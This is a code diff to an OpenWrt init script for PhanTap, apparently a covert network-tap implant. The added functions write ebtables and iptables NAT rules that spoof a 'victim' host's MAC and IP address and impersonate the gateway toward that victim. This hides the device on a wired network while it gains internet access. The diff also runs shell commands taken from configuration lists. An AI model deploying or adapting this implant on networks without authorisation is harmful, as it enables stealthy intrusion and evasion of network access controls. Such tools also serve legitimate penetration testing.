@@ -2,7 +2,7 @@
 
 START=01
 USE_PROCD=1
-EXTRA_COMMANDS="setup"
+EXTRA_COMMANDS="setup block_net conf_net"
 
 boot()
 {
@@ -16,10 +16,35 @@ boot()
 start_service()
 {
     procd_open_instance "phantap"
-    procd_set_param command /usr/bin/phantap
+    procd_set_param command /usr/sbin/phantap-learn -i br-phantap -v1
+    procd_append_param command -b '/etc/init.d/phantap block_net'
+    procd_append_param command -c '/etc/init.d/phantap conf_net'
     procd_set_param stdout 1
     procd_set_param stderr 1
     procd_close_instance
+}
+
+block_net() {
+    # block local output on br-phantap
+    ebtables -t filter -A phantap-drop -j DROP
+}
+
+conf_net() {
+    # P_VICTIM_MAC P_VICTIM_IP P_NETMASK P_GATEWAY_MAC P_GATEWAY_IP P_DNS P_NTP
+    echo "conf_net: P_VICTIM_MAC=$P_VICTIM_MAC P_VICTIM_IP=$P_VICTIM_IP P_GATEWAY_MAC=$P_GATEWAY_MAC P_GATEWAY_IP=$P_GATEWAY_IP P_DNS=$P_DNS"
+    . /lib/functions.sh
+
+    _config_firewall
+
+    config_load phantap
+    # Run all commands in onnetconfig list
+    config_list_foreach main onnetconfig _handle_onconfig
+
+    if [ "$P_DNS" != "0.0.0.0" ]; then
+        _config_dns
+        # Run all commands in ondnsconfig list
+        config_list_foreach main ondnsconfig _handle_onconfig
+    fi
 }
 
 setup() {
@@ -72,4 +97,69 @@ EOF
 
 uci commit
 
+}
+
+_config_dns() {
+    echo "nameserver $P_DNS" > /tmp/resolv.conf.auto
+    /etc/init.d/dnsmasq reload
+}
+
+_config_firewall() {
+. /lib/functions/network.sh
+
+P_INTF=phantap
+network_get_device P_BRIDGE $P_INTF
+[ -z "$P_BRIDGE" ] && { echo "Bridge not ready"; exit; }
+P_BR_MAC=$(cat /sys/class/net/$P_BRIDGE/address)
+network_get_ipaddr P_BR_IP $P_INTF
+network_get_gateway P_GW_FAKEIP $P_INTF true
+
+# Integrate with OpenWRT firewall
+cat > /tmp/phantap.firewall.$$ <<EOF
+# block local output on br-phantap
+ebtables -t filter -A phantap-drop -j DROP
+
+ebtables -t nat -N phantap-snat -P RETURN 2>/dev/null \
+&& ebtables -t nat -I POSTROUTING -j phantap-snat
+iptables -t nat -N phantap-snat 2>/dev/null
+iptables -t nat -C POSTROUTING -o br-phantap -j phantap-snat \
+|| iptables -t nat -I POSTROUTING -o br-phantap -j phantap-snat
+
+# Cleanup old rules if exist
+ebtables -t nat -F phantap-snat
+iptables -t nat -F phantap-snat
+$(if [ "$P_GATEWAY_IP" != "0.0.0.0" ]; then
+cat <<EOS
+# We have detected the gateway ip, impersonate the gateway when talking to the victim
+ebtables -t nat -A phantap-snat -s $P_BR_MAC -d $P_VICTIM_MAC --logical-out $P_BRIDGE -j snat --to-source $P_GATEWAY_MAC
+iptables -t nat -A phantap-snat -s $P_BR_IP -d $P_VICTIM_IP -j SNAT --to-source $P_GATEWAY_IP
+EOS
+else
+cat <<EOS
+# We have not detected the gateway ip, drop all traffic from phantap to the victim
+ebtables -t nat -A phantap-snat -s $P_BR_MAC -d $P_VICTIM_MAC --logical-out $P_BRIDGE -j DROP
+EOS
+fi
+)
+# Replace our local mac with the victim mac
+ebtables -t nat -A phantap-snat -s $P_BR_MAC --logical-out $P_BRIDGE -j snat --to-source $P_VICTIM_MAC
+# Replace our local ip with the victim ip
+iptables -t nat -A phantap-snat -s $P_BR_IP -j SNAT --to-source $P_VICTIM_IP
+
+# Add mac for the fake gateway
+ip neigh replace $P_GW_FAKEIP lladdr $P_GATEWAY_MAC dev $P_BRIDGE
+
+# allow local output on br-phantap again, we now have internet access
+ebtables -t filter -F phantap-drop
+
+echo "PhanTap firewall rules reloaded, you now have internet"
+EOF
+mv /tmp/phantap.firewall.$$ /tmp/phantap.firewall
+
+ebtables -t filter -A phantap-drop -j DROP
+/etc/init.d/firewall reload
+}
+
+_handle_onconfig() {
+    /bin/sh -c "$1" || echo "'$1' failed"
 }
